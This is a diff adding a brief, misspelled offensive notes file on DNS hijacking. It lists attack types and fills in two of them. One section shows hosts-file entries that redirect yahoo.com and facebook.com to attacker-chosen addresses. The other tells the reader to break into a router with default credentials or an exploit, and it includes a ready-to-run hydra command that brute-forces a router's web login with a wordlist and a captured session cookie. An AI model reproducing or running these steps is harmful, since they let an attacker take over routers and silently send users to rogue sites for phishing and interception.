@@ -1,0 +1,40 @@
+DNS Hacking Type
+--------------
+{
+  Local DNS hijack
+  Router DNS hijack
+  Man in the middle DNS attacks
+  Rogue DNS Server
+  DNS spoofing 
+  DNS Cache poisoning 
+}
+
+Local DNS hijack
+----------------
+{
+  vi C:\Windows\System32\Drivers\etc\hosts
+  {
+    xxx.xxx.xxx.xxx yahoo.com
+    192.168.10.10   facebook.com
+  }
+}
+
+
+Router DNS hijack
+-----------------
+{
+  #get into router , by default cred. or exploit vulerability
+  change the DNS setting.
+ 
+  #fiddler  or burbsuite // get the bloew sting and use HYDRA
+  #hydra -l "" -P "/usr/sahre/wordlist/pass.txt" 192.154.1.1 http-post-form "/cgi-bin/webproc:%3Ausername=^USER^&%3Apassword=^PASS^&%3Aaction=Login;H=Cookie: %3Asessionid=68b3e673"
+  
+  
+  
+  
+
+
+
+}
+
+
